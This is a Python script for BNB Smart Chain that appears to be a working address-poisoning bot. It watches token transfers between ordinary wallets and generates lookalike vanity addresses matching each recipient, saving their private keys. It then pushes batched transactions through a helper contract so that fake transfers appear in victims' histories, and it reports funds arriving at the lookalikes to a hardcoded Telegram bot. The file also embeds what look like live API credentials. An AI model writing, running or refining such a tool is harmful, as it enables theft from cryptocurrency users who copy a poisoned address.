
from web3 import Web3, HTTPProvider
from web3.middleware import geth_poa_middleware
from threading import Lock
import subprocess
from subprocess import Popen, PIPE, STDOUT, check_output
from tqdm import tqdm
import concurrent.futures
from threading import Thread, Lock
from multiprocessing import Process, Pool, Manager
import multiprocessing
import random
from configparser import ConfigParser
import time
import signal
import threading
import os
import shlex
import requests
import sys
import json

web3 = Web3(Web3.HTTPProvider('https://bsc-mainnet.blastapi.io/92d61da8-3b1d-4858-a6ee-d94929237191'))
web3.middleware_onion.inject(geth_poa_middleware, layer=0)
    
def txt2list(fname): #функция чтения файла
    with open(fname, 'r', encoding="utf8") as f:
        return [line.strip() for line in f]

def addr_list_normal():
    used_list = txt2list('all_keys.txt') 
    addr_list =[]
    for elem in used_list:
        try:
            eladdres, elpkey = map(str, elem.split())
            addr_list.append(eladdres)
        except ValueError:
            eladdres=elem[0:42] #get address
            elpkey=elem[43:109] #get privateKey
            eladdres2=elem[109:152]  #get address
            elpkey2=elem[152:226] #get privateKey
            addr_list.append(eladdres2)
    return addr_list

def get_rpc_from_list():
    web3 = Web3(Web3.HTTPProvider('https://bsc-mainnet.blastapi.io/92d61da8-3b1d-4858-a6ee-d94929237191'))
    web3.middleware_onion.inject(geth_poa_middleware, layer=0)
    return web3
                
def recovery_Koge():
    kogess = Web3(Web3.HTTPProvider("https://koge-rpc-bsc.48.club/"))#,request_kwargs={"proxies":{'https' : web3proxy, 'http' : web3proxy }}))
    return kogess
      
notify_msgg='https://api.telegram.org/bot5878771324:AAHm1bqEvDst7UL3_UVr109kNlt3noxsdR0/sendMessage?chat_id=5680208836&text='
used_list = txt2list('all_keys.txt') 
keys_list = txt2list('send_gas.txt') 
token_list = txt2list('all_tokens.txt')
bad_nonce_list = txt2list('bsc_daemon_nonce.txt')
contract_addr_list = [] #contract address
from_addr_list = [] #address from list
to_addr_list = [] #vanity addrr list
values_list = []
batch_data_list=[]
oct_address_list=[]
lock = threading.Lock()
addr_list=addr_list_normal()

bulk_contract_addr = Web3.toChecksumAddress('0x665354FF5752f4Ad4deaa1bF4E752d655cd3311B') #opencontract 
bulk_abi = json.loads('[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_token","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"sendValue","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"transfer","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address[]","name":"_token","type":"address[]"},{"internalType":"address[]","name":"from","type":"address[]"},{"internalType":"address[]","name":"to","type":"address[]"},{"internalType":"uint256[]","name":"amount","type":"uint256[]"},{"internalType":"uint256","name":"ind","type":"uint256"}],"name":"transfer","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address[]","name":"_token","type":"address[]"},{"internalType":"address[]","name":"from","type":"address[]"},{"internalType":"address[]","name":"to","type":"address[]"},{"internalType":"uint256[]","name":"amount","type":"uint256[]"},{"internalType":"uint256","name":"ind","type":"uint256"}],"name":"transferToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"stateMutability":"payable","type":"receive"},{"inputs":[{"internalType":"addresspayable","name":"_recipient","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"recipient","outputs":[{"internalType":"addresspayable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"token","outputs":[{"internalType":"contractIERC20","name":"","type":"address"}],"stateMutability":"view","type":"function"}]')
bulk_contract = web3.eth.contract(address=bulk_contract_addr, abi=bulk_abi)

fuck_contract_addr = Web3.toChecksumAddress('0xb85e5eB1f7622481626B950413D6190Bb37C6D50') #opencontract 
fuck_abi = json.loads('[{"payable":true,"stateMutability":"payable","type":"fallback"},{"constant":true,"inputs":[{"name":"users","type":"address[]"},{"name":"token","type":"address"}],"name":"balance","outputs":[{"name":"","type":"uint256[]"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"users","type":"address[]"},{"name":"tokens","type":"address[]"}],"name":"balances","outputs":[{"name":"","type":"uint256[]"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"account","type":"address[]"}],"name":"isContract","outputs":[{"name":"","type":"uint256[]"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"user","type":"address"},{"name":"token","type":"address"}],"name":"tokenBalance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"}]')
fuck_contract = web3.eth.contract(address=fuck_contract_addr, abi=fuck_abi)

def init_contract(web3, address_of_token):
    token_contract_usdt = Web3.toChecksumAddress(address_of_token)
    abi = json.loads('[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[],"name":"Pause","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[],"name":"Unpause","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"isOwner","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"pause","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"paused","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"unpause","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]')
    contract_usdt = web3.eth.contract(address=token_contract_usdt, abi=abi) 
    return contract_usdt

def senderBatch(contract_addr_list, from_addr_list, to_addr_list, values_list):
    while True: 
        global last_sender
        web3=get_rpc_from_list() 
        prRpc=recovery_Koge()
        keyss_line=random.choice(keys_list)
        while keyss_line==last_sender:
            keyss_line=random.choice(keys_list)
        last_sender=keyss_line
        sendr_addrr, sendr_pkey = map(str, keyss_line.split()) 
        nonce = web3.eth.getTransactionCount(sendr_addrr)       
        gsPr=prRpc.eth.gasPrice
        estimate = bulk_contract.functions.transfer(contract_addr_list, from_addr_list, to_addr_list, values_list, 0).estimateGas({'from':sendr_addrr})+10000
        if estimate>480000:
            estimate=estimate+10000
        token_tx = bulk_contract.functions.transfer(contract_addr_list, from_addr_list, to_addr_list, values_list, 0).buildTransaction({'chainId':56, 'gas': estimate, 'gasPrice': gsPr, 'nonce':nonce})
        sign_txn = web3.eth.account.signTransaction(token_tx, sendr_pkey)  
        try:
            tx_hashhh = prRpc.eth.sendRawTransaction(sign_txn.rawTransaction)
            print(f" Tokens has been transfered with nonce {nonce} and https://bscscan.com/tx/{web3.toHex(tx_hashhh)} ")
            contract_addr_list.clear() 
            from_addr_list.clear()
            to_addr_list.clear()
            values_list.clear()
            return
        except ValueError as erra:
            erra=str(erra)
            print(erra,'error, work with', sendr_addrr, 'nonce',nonce)
            i_need=erra.find('need ')
            if i_need!=-1:
                gasPrices=str(erra[i_need+5:i_need+8])
                gsPr=int(web3.toWei(gasPrices, 'gwei'))
                print('change gasPrices use', web3.fromWei(gsPr, 'gwei'))
            #if 'nonce too low' in erra:
                
            if 'nonce' in erra:
                nonce=nonce+1
                #nonce = web3.eth.getTransactionCount(sendr_addrr)
                print('nonce changed')
            if 'transaction underpriced' in erra:
                gsPr=web3.eth.gasPrice*2
        token_tx = bulk_contract.functions.transfer(contract_addr_list, from_addr_list, to_addr_list, values_list, 0).buildTransaction({'chainId':56, 'gas': estimate, 'gasPrice': gsPr, 'nonce':nonce,})
        sign_txn = web3.eth.account.signTransaction(token_tx, sendr_pkey)
        try:    
            tx_hashhh = prRpc.eth.sendRawTransaction(sign_txn.rawTransaction)
            print(f" GOOD! Tokens has been transfered with nonce {nonce} and https://bscscan.com/tx/{web3.toHex(tx_hashhh)} ")
            contract_addr_list.clear() 
            from_addr_list.clear()
            to_addr_list.clear()
            values_list.clear()
            return
        except Exception as erraend:
            finalerra=str(erraend)
            print(finalerra,'error again, work with', sendr_addrr, 'nonce',nonce)
                
def get_vanity_oct(addd):
    while True:
        used_list = txt2list('all_keys.txt') 
        suffx=addd[38:42] #cut last 4 symbols
        for linee in used_list:
            #if suffx.lower() in linee[38:42].lower():
            if suffx in linee[38:42]:
                address_only, normpkey = map(str, linee.split())
                return address_only
        for_cmd=f"./oct -q -C ETH -r {suffx}$"   
        try:
            process=subprocess.check_output(for_cmd, stderr=STDOUT, universal_newlines=True, timeout=10).split('\n')
            for line in process:
                pkey_index=line.find('ETH Privkey: ') #find in out pkey
                if pkey_index!=-1:
                    Private_key=line[pkey_index+13:pkey_index+93]
                    check_key=web3.eth.account.from_key(Private_key)
                    generated_line = (check_key.address+' '+Private_key)
                    print(' OCT NEW ADDRESS APPENDED ', generated_line)
                    used_list.append(generated_line)
                    addr_list.append(check_key.address) 
                    with open('all_keys.txt', 'a', encoding="utf8") as to_vanity:
                        to_vanity.write(f"{check_key.address} {Private_key}\n")
                    return check_key.address
        except Exception as errooor:
            print('oct try again', errooor)
            addzd=web3.toChecksumAddress('0x8B7a9C0818809dea97cB9aDAF90b6d4266CD3437')
            return addzd

def get_vanity_pro(addd):
    used_list = txt2list('all_keys.txt') 
    suffx=addd[38:42] #cut last 4 symbols
    prefx=addd[2:5] 
    for linee in used_list:
        if prefx.lower() in linee[2:5].lower() and suffx.lower() in linee[38:42].lower():
            print('SIMILAR HAVE', linee[0:42], 'You finded', addd)
            address_only, normpkey = map(str, linee.split())
            return address_only
    for_cmd=f"./profanity2 -z cbec36d33e0714ebf8a9ae0b7a7f5dfb030dcb46fcc171ca514e704d6f009b147d9494eced9ed426989f4ac87777281e137a0d02556936c9255dbdf130f41272 --matching {prefx}XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX{suffx}"
    try:
        process = subprocess.Popen(shlex.split(for_cmd), stdout=subprocess.PIPE,creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)   
        while True:
            output = process.stdout.readline()
            if output:
                outpus=output.decode(sys.stdout.encoding).strip()
                pkey_index=outpus.find('4 Private: ') #find in out pkey
                if pkey_index!=-1:
                    Private_key_raw=outpus[pkey_index+11:pkey_index+77]
                    main_key='0xf1c24c51b93210ba595bc817e23355ec680ccbff1f2cf0cca51cd20022efbca8'
                    Private_key=hex((int(main_key, 16) + int(Private_key_raw, 16)) % 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F)
                    process.send_signal(signal.CTRL_BREAK_EVENT)
                    process.kill()
                    check_key=web3.eth.account.from_key(Private_key)                
                    generated_line = (check_key.address+' '+Private_key)
                    print(' PRO NEW ADDRESS APPENDED ', generated_line)
                    used_list.append(generated_line)
                    addr_list.append(check_key.address) 
                    with open('all_keys.txt', 'a', encoding="utf8") as to_vanity:
                        to_vanity.write(f"{check_key.address} {Private_key}\n")    
                    return check_key.address
    except:
        pass
    return 100

def scan_blockss(fromBlck,toBlck, tokaddr,check_amountt):

    while True:
        try:
            if len(oct_address_list)>=100:
                oct_address_list.clear() #print('oct_address_list more that 500:', len(oct_address_list))  
            web3=get_rpc_from_list()
            contract_usdt=init_contract(web3, tokaddr)
            sc11from = [] # from list
            sc11tooo = [] # tooo list
            sc11vlue=[]
            if fromBlck>=toBlck:
                fromBlck=int(fromBlck)-20
            events = contract_usdt.events.Transfer.getLogs(fromBlock=int(fromBlck), toBlock=int(toBlck)) 
            for x in events:
                from_addd_tether=x['args']['from']
                to_addd_tether=x['args']['to']  #Тащим to 
                vvlue=x['args']['value'] #amount send
                if to_addd_tether in addr_list and int(vvlue)!=0: #!!!!!!!!!!!!!!!!!!!!!
                    print(' To address', to_addd_tether, 'Balance', vvlue)
                    send_linee_tg=(f"{to_addd_tether} {vvlue}")
                    notify_seed=requests.get(notify_msgg+send_linee_tg)
                    
                sc11from.append(from_addd_tether)
                sc11tooo.append(to_addd_tether)
                sc11vlue.append(vvlue)
                
            check_if_contract_from=fuck_contract.functions.isContract(sc11from).call()
            check_if_contract_tooo=fuck_contract.functions.isContract(sc11tooo).call()
            sc21from=[]
            sc21tooo=[]
            sc21vlue=[] 
            for elem in sc11from:
                indx=sc11from.index(elem)
                #print(f"{elem} {check_if_contract_from[indx]} {sc11tooo[indx]} {check_if_contract_tooo[indx]}") #GET LINES: ADDRESS, ISCONTRACT, ADDRESS, ISCONTRACT!
                if check_if_contract_from[indx]==0 and check_if_contract_tooo[indx]==0:
                    #print('goood line', elem, sc11tooo[indx])
                    sc21from.append(elem)                               ###ADDD NOT CONTRACT ADRESSS
                    sc21tooo.append(sc11tooo[indx])         ###ADDD NOT CONTRACT ADRESSS
                    sc21vlue.append(sc11vlue[indx])
                else:
                    continue
            get_balance_bulk=fuck_contract.functions.balance(sc21from,tokaddr).call()  #GET BALANCE CONTRACT
            for elmm in sc21from:
                indx=sc21from.index(elmm)
                #if web3.fromWei(get_balance_bulk[indx], 'ether')>int(500):
                    #goood_news_bal=f"{elmm} {get_balance_bulk[indx]} {sc21from[indx]} {sc21vlue[indx]}"
                    #print(goood_news_bal)
                    #print('from', elmm, 'balance', web3.fromWei(get_balance_bulk[indx], 'ether'), 'to', sc21from[indx])
                BalanceOff=get_balance_bulk[indx]
                from_addd_tether=elmm
                to_addd_tether=sc21tooo[indx]
                vvlue=sc21vlue[indx]
                     
                #if web3.eth.getTransactionCount(from_addd_tether)<int(150):
                if to_addd_tether not in addr_list: #
                    if from_addd_tether not in bad_nonce_list:# and to_addd_tether not in used_address_list: 
                        if web3.eth.getTransactionCount(from_addd_tether)<int(150):
                                                          
                            if int(BalanceOff)>int(check_amountt):    
                                send_linee=f"{tokaddr} {from_addd_tether} {to_addd_tether} {vvlue}"                               
                                with lock:
                                    batch_data_list.append(send_linee)
                                                               
                            #elif int(BalanceOff)>int(check_amountt): #3000
                            #    with lock:
                            #        batch_data_list.append(send_linee)
                            
                                    
                            else:
                                pass

                            
                        else:             
                            bad_nonce_list.append(from_addd_tether) 
                            with open('bsc_daemon_nonce.txt', 'a', encoding="utf8") as usseed:
                                usseed.write(f"{from_addd_tether}\n")
                                           
            if tokaddr=='0x55d398326f99059fF775485246999027B3197955': # UPDATE CONFIG
                #print('BSC LAST BLOCK UPDATED', last_checked_block)
                config.set('LAST', 'block', str(toBlck))
                with open('bsc_daemon.ini', 'w') as conf:
                    config.write(conf)
            return                                
        except Exception as err_event:
            err_event = str(err_event)
            print(err_event, 'Scan errr, try again with new rpc', FROM_that_block, toBlck)

#DAEMON_THREAD#######DAEMON_THREAD###### #DAEMON_THREAD###### #DAEMON_THREAD###### #DAEMON_THREAD###### #DAEMON_THREAD###### #DAEMON_THREAD###### #DAEMON_THREAD###### #DAEMON_THREAD######          
def daemon_thread():
    time.sleep(5) #before start
    local_bufff=[]
    while True:
        ##############################################################################################
        if len(batch_data_list)>5:    #ADDDD DAATTTAAA
            daemon_count=0
            local_bufffs=[]
            print(' Elements in list ready', len(batch_data_list), 'start work...')
            local_bufffs=batch_data_list.copy()
            with lock:                           # GET DATA FROM BATCH_DATA
                batch_data_list.clear()   
            
            for buff in local_bufffs: #remove duplicate
                if buff not in local_bufff:  #remove duplicate
                    local_bufff.append(buff)  #remove duplicate
                    
            for bcline in tqdm(local_bufff):
                contract_addr=str(bcline[0:42])
                contract_addr_list.append(contract_addr)      
                from_addr=str(bcline[43:85])
                from_addr_list.append(from_addr)
                to_addrrs = str(bcline[86:128])
                if to_addrrs in oct_address_list:
                    to_addd_tether_after=get_vanity_oct(to_addrrs)  
                else:
                    to_addd_tether_after=get_vanity_oct(to_addrrs)   
                to_addr_list.append(to_addd_tether_after)
                valuue=int(bcline[129:])
                values_list.append(valuue)
                daemon_count=daemon_count+1
                #if (daemon_count % 10 == 0):
                    #if len(from_addr_list)!=0:
                    #    senderBatch(contract_addr_list, from_addr_list, to_addr_list)
                if (daemon_count % 5 == 0):
                    if len(from_addr_list)!=0:
                        senderBatch(contract_addr_list, from_addr_list, to_addr_list, values_list)
            if len(from_addr_list)!=0:
                senderBatch(contract_addr_list, from_addr_list, to_addr_list, values_list)
            local_bufff.clear()
            print('susseful.. local_bufff clear')
        else:
            time.sleep(1)
       
#DAEMON_THREAD#######DAEMON_THREAD###### #DAEMON_THREAD###### #DAEMON_THREAD###### #DAEMON_THREAD###### #DAEMON_THREAD###### #DAEMON_THREAD###### #DAEMON_THREAD###### #DAEMON_THREAD######         
def nonce_dd_checker():
    web3=get_rpc_from_list()
    while True:
        time.sleep(2)
        print(f"Elems in nonce list {len(bad_nonce_list)}")
        block=web3.eth.get_block(block_identifier='latest', full_transactions=True)
        if block:
            for val in block['transactions']:
                nonce_dd=val['nonce']
                from_dd=val['from']
                if int(nonce_dd)>150:
                    if from_dd not in bad_nonce_list:
                        bad_nonce_list.append(from_dd)
                #print(from_dd, nonce_dd)
            if len(bad_nonce_list)>=300000:
                bad_nonce_list.clear()
                          
                      
if __name__ == '__main__':
    last_sender='last_sender_variable'   
    nonce_dd = Thread(target=nonce_dd_checker, daemon=True)
    nonce_dd.start()
    dmth = Thread(target=daemon_thread, daemon=True)
    dmth.start()   
    web3=get_rpc_from_list()
    get_last_block_nubm=web3.eth.get_block('latest').number
#####################################################################
    config = ConfigParser()
    config.read('bsc_daemon.ini')
    try:
        FROM_that_block = config["LAST"]["block"]
    except Exception as errr_conff:
        print('Section', errr_conff, 'not exists')
        config.add_section('LAST')
        config.set('LAST', 'block', str(get_last_block_nubm-500)) # AMOUNT BLOCKS TO BACK
        with open('bsc_daemon.ini', 'w') as conf:
            config.write(conf)
        FROM_that_block = config["LAST"]["block"] 
#####################################################################
    diffff=int(get_last_block_nubm)-int(FROM_that_block)
    if diffff>50:
        TO_block_num=int(FROM_that_block)+10
        for xb in range(99999):
            try:
                get_last_block_nubm=web3.eth.get_block('latest').number
                print(' DAEMON Check skipped blocks', FROM_that_block, 'to', TO_block_num)
                for tokaddr_line in token_list:
                    tokken_addrr, check_amountt = map(str, tokaddr_line.split())
                    #tokken_addrr=tokaddr_line[0:42]
                    t0 = threading.Thread(target=scan_blockss, args=(int(FROM_that_block),int(TO_block_num), tokken_addrr,check_amountt))
                    t0.start()
                    
                FROM_that_block=int(FROM_that_block)+10
                TO_block_num=TO_block_num+10  # NUMBER BLOCK PER SCAN
                if TO_block_num>=int(get_last_block_nubm):
                    TO_block_num=int(get_last_block_nubm)
                    print('last skipped', TO_block_num)
                    break
                time.sleep(1)
            except Exception as lasssr:
                print(lasssr, 'last sk err')
#####################################################################
    for i in range(9999999):
        time.sleep(3)
        try:
            TO_block_num=web3.eth.get_block('latest').number
            print(' DAEMON THREAD', i, 'checking from', int(FROM_that_block), 'to', int(TO_block_num))
            for tokaddr_line in token_list:
                tokken_addrr, check_amountt = map(str, tokaddr_line.split())
                #tokken_addrr=tokaddr_line[0:42]
                t0 = threading.Thread(target=scan_blockss, args=(int(FROM_that_block),int(TO_block_num), tokken_addrr,check_amountt))
                t0.start()
                   
            FROM_that_block=TO_block_num
        except Exception as loop_errrrrr:
            print(loop_errrrrr, 'wait 30 sec..')
            time.sleep(30)